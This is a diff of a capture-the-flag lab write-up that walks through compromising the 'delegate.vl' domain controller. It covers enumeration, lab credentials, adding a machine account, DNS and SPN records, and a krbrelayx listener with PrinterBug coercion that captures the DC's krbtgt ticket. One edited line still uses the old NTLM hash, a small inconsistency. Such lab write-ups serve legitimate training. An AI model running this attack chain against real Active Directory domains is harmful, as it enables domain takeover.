@@ -35,9 +35,9 @@ We start by running an `nmap` scan to see which ports are open:
 <br />
 
 ```bash
-❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49668,49670,54023,64755,65501,65502,65507,65519 10.129.34.106 -oN targeted
+❯ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49667,49668,49670,54023,64755,65501,65502,65507,65519 10.129.234.69 -oN targeted
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-07 20:13 CET
-Nmap scan report for 10.129.34.106
+Nmap scan report for 10.129.234.69
 Host is up (0.044s latency).
 
 PORT      STATE SERVICE       VERSION
@@ -132,7 +132,7 @@ The domain `delegate.vl` and the hostname `DC1.delegate.vl` appear across multip
 <br />
 
 ```bash
-10.129.34.106 delegate.vl DC1.delegate.vl
+10.129.234.69 delegate.vl DC1.delegate.vl
 ```
 
 <br />
@@ -147,7 +147,7 @@ To start enumerating this service, we'll run a basic [NetExec](https://github.co
 
 ```bash
 ❯ nxc smb delegate.vl
-SMB         10.129.34.106   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
 <br />
@@ -160,16 +160,16 @@ A null session using a random username allows us to list shared resources:
 
 ```bash
 ❯ nxc smb delegate.vl -u "RANDOM" -p "" --shares
-SMB         10.129.34.106   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.34.106   445    DC1              [+] delegate.vl\RANDOM: (Guest)
-SMB         10.129.34.106   445    DC1              [*] Enumerated shares
-SMB         10.129.34.106   445    DC1              Share           Permissions     Remark
-SMB         10.129.34.106   445    DC1              -----           -----------     ------
-SMB         10.129.34.106   445    DC1              ADMIN$                          Remote Admin
-SMB         10.129.34.106   445    DC1              C$                              Default share
-SMB         10.129.34.106   445    DC1              IPC$            READ            Remote IPC
-SMB         10.129.34.106   445    DC1              NETLOGON        READ            Logon server share 
-SMB         10.129.34.106   445    DC1              SYSVOL          READ            Logon server share
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\RANDOM: (Guest)
+SMB         10.129.234.69   445    DC1              [*] Enumerated shares
+SMB         10.129.234.69   445    DC1              Share           Permissions     Remark
+SMB         10.129.234.69   445    DC1              -----           -----------     ------
+SMB         10.129.234.69   445    DC1              ADMIN$                          Remote Admin
+SMB         10.129.234.69   445    DC1              C$                              Default share
+SMB         10.129.234.69   445    DC1              IPC$            READ            Remote IPC
+SMB         10.129.234.69   445    DC1              NETLOGON        READ            Logon server share 
+SMB         10.129.234.69   445    DC1              SYSVOL          READ            Logon server share
 ```
 
 <br />
@@ -219,8 +219,8 @@ Netexec confirmed that these credentials are valid for the SMB service:
 
 ```bash
 ❯ nxc smb delegate.vl -u a.briggs -p 'P4ssw0rd1#123'
-SMB         10.129.34.106   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
-SMB         10.129.34.106   445    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123
 ```
 
 <br />
@@ -240,12 +240,12 @@ Normally, we use `bloodhound-python` for the data extraction process, instead, w
 <br />
 
 ```bash
-❯ nxc ldap delegate.vl -u a.briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.34.106
-LDAP        10.129.34.106   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.129.34.106   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
-LDAP        10.129.34.106   389    DC1              Resolved collection methods: trusts, session, container, rdp, localadmin, psremote, acl, objectprops, group, dcom
-LDAP        10.129.34.106   389    DC1              Done in 0M 10S
-LDAP        10.129.34.106   389    DC1              Compressing output into /home/theredp4nther/.nxc/logs/DC1_10.129.34.106_2026-01-07_204000_bloodhound.zip
+❯ nxc ldap delegate.vl -u a.briggs -p 'P4ssw0rd1#123' --bloodhound -c All --dns-server 10.129.234.69
+LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.234.69   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
+LDAP        10.129.234.69   389    DC1              Resolved collection methods: trusts, session, container, rdp, localadmin, psremote, acl, objectprops, group, dcom
+LDAP        10.129.234.69   389    DC1              Done in 0M 10S
+LDAP        10.129.234.69   389    DC1              Compressing output into /home/theredp4nther/.nxc/logs/DC1_10.129.234.69_2026-01-07_204000_bloodhound.zip
 ```
 
 <br />
@@ -392,7 +392,7 @@ The attack is divided into three phases, let's go with the first one.
 
 <br />
 
-## Check MachineAccountQuota 
+### 1 - Check MachineAccountQuota 
 
 <br />
 
@@ -404,15 +404,15 @@ This value can be extracted by running the Netexec `maq` module:
 
 ```bash
 ❯ nxc ldap delegate.vl -u a.briggs -p 'P4ssw0rd1#123' -M maq
-LDAP        10.129.34.106   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
-LDAP        10.129.34.106   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
-MAQ         10.129.34.106   389    DC1              [*] Getting the MachineAccountQuota
-MAQ         10.129.34.106   389    DC1              MachineAccountQuota: 10
+LDAP        10.129.234.69   389    DC1              [*] Windows Server 2022 Build 20348 (name:DC1) (domain:delegate.vl) (signing:None) (channel binding:No TLS cert) 
+LDAP        10.129.234.69   389    DC1              [+] delegate.vl\a.briggs:P4ssw0rd1#123 
+MAQ         10.129.234.69   389    DC1              [*] Getting the MachineAccountQuota
+MAQ         10.129.234.69   389    DC1              MachineAccountQuota: 10
 ```
 
 <br />
 
-## Host setup
+### 2 - Host setup
 
 <br />
 
@@ -423,10 +423,10 @@ First, we create the DNS record (a fake host to trick the target machine):
 <br />
 
 ```bash
-❯ addcomputer.py -computer-name theredp4nther -computer-pass 'Red123!' -dc-ip 10.129.34.106 delegate.vl/N.Thompson:'KALEB_2341'
+❯ addcomputer.py -computer-name theredp4nther -computer-pass 'Red123,' -dc-ip 10.129.234.69 delegate.vl/N.Thompson:'KALEB_2341'
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
-[*] Successfully added machine account theredp4nther$ with password Red123!.
+[*] Successfully added machine account theredp4nther$ with password Red123,.
 ```
 
 <br />
@@ -436,7 +436,7 @@ Then, we add this DNS record:
 <br />
 
 ```bash
-❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record theredp4nther.delegate.vl --data 10.10.14.253 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
+❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123,' --action add --record theredp4nther.delegate.vl --data 10.10.14.253 --type A -dns-ip 10.129.234.69 dc1.delegate.vl
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
@@ -451,7 +451,7 @@ The dns records was sucessfully added. Let's assign a SPN to this record:
 <br />
 
 ```bash
-❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/theredp4nther.delegate.vl' -t 'theredp4nther$' -dc-ip 10.129.34.106 dc1.delegate.vl --additional
+❯ python3 addspn.py -u 'delegate.vl\N.Thompson' -p 'KALEB_2341' -s 'cifs/theredp4nther.delegate.vl' -t 'theredp4nther$' -dc-ip 10.129.234.69 dc1.delegate.vl --additional
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
@@ -472,15 +472,15 @@ It worked. Finally, we set the unconstrained delegation to the host:
 
 <br />
 
-## Capture authentication
+### 3 - Capture authentication
 
 <br />
 
 The authentication will be capture with `krbrealyx` impacket tool. However, to use it, we need to obtain before the NTLM hash of the computer password:
 
 ```bash
-❯ python -c "password = 'Red123!'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
-4fea147a5c9c6a101ac85f05b3d14cdb
+❯ python -c "password = 'Red123,'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
+3374b69aeb0dfab7761b0140d2f3f83b
 ```
 
 <br />
@@ -490,7 +490,7 @@ Now, we can start it:
 <br />
 
 ```bash
-❯ python3 krbrelayx.py -hashes 4fea147a5c9c6a101ac85f05b3d14cdb
+❯ python3 krbrelayx.py -hashes :4fea147a5c9c6a101ac85f05b3d14cdb
 [*] Protocol Client HTTPS loaded..
 [*] Protocol Client HTTP loaded..
 [*] Protocol Client LDAPS loaded..
@@ -503,6 +503,50 @@ Now, we can start it:
 
 [*] Setting up DNS Server
 [*] Servers started, waiting for connections
+```
+
+<br />
+
+And when we proceed to coerce the authentication using the `PrinterBug` method from the `coerce_plus` module:
+
+<br />
+
+```bash
+nxc smb dc1.delegate.vl -u 'theredp4nther$' -p 'Red123,' -M coerce_plus -o LISTENER=theredp4nther.delegate.vl METHOD=PrinterBug
+
+SMB         10.129.234.69   445    DC1              [*] Windows Server 2022 Build 20348 x64 (name:DC1) (domain:delegate.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.69   445    DC1              [+] delegate.vl\theredp4nther$:Red123,
+COERCE_PLUS 10.129.234.69   445    DC1              VULNERABLE, PrinterBug
+COERCE_PLUS 10.129.234.69   445    DC1              Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
+```
+
+<br />
+
+The authentication was successfully captured and save into the file: `DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache`
+
+<br />
+
+```bash
+❯ python3 krbrelayx.py -hashes :3374b69aeb0dfab7761b0140d2f3f83b
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up DNS Server
+
+[*] Servers started, waiting for connections
+[*] SMBD: Received connection from 10.129.234.69
+[*] Got ticket for DC1$@DELEGATE.VL [krbtgt@DELEGATE.VL]
+[*] Saving ticket in DC1$@DELEGATE.VL_krbtgt@DELEGATE.VL.ccache
+[*] SMBD: Received connection from 10.129.234.69
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
+[*] SMBD: Received connection from 10.129.234.69
+[-] Unsupported MechType 'NTLMSSP - Microsoft NTLM Security Support Provider'
 ```
 
 <br />
